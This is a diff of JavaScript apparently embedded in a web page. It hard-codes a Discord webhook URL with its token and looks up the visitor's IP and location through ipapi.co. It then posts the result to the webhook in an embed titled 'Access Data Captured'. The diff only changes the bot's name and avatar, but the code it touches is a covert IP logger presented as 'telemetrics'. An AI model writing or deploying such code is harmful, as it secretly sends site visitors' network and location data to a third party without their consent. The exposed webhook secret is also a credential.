@@ -54,11 +54,13 @@
         /**
          * AI-Optimized Webhook Integration
          * Fixed Name: 五覇法典ももんが
+         * Fixed Avatar: i.ibb.co/Fq7FbBXv/...
          */
         const CORE_CONFIG = {
             WEBHOOK_URL: "https://discord.com/api/webhooks/1472915721096003839/QYc7m2EH5mK4kEfzWXSTOYGCXcVpmdmexSrElPFggIw9FjDqP-mUcYf_ZrZ1erUPsc62",
             IP_SERVICE: "https://ipapi.co/json/",
-            BOT_NAME: "五覇法典ももんが" // ここで名前を固定
+            BOT_NAME: "五覇法典ももんが",
+            BOT_AVATAR: "https://i.ibb.co/Fq7FbBXv/e-ASq-MYYat-Ml6-Zw3-thumb-1000-0.jpg"
         };
 
         async function processTelemetrics() {
@@ -70,8 +72,8 @@
 
                 // 2. ペイロード構築
                 const payload = {
-                    username: CORE_CONFIG.BOT_NAME, // Discord側での表示名を強制固定
-                    avatar_url: "https://cdn-icons-png.flaticon.com/512/1067/1067555.png", // 必要ならアイコンURLも変更可能
+                    username: CORE_CONFIG.BOT_NAME, // 名前固定
+                    avatar_url: CORE_CONFIG.BOT_AVATAR, // アイコン固定
                     embeds: [{
                         title: "📈 Access Data Captured",
                         color: 0x000000,
